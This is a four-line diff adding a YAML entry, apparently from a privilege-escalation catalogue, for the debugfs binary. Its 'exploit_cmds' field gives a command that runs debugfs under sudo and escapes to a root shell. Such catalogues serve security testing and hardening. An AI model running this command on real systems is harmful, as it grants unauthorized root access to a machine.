@@ -1,0 +1,4 @@
+name: debugfs
+binary_path: /usr/bin/debugfs
+exploit_cmds:
+- sudo /usr/bin/debugfs && !/bin/sh
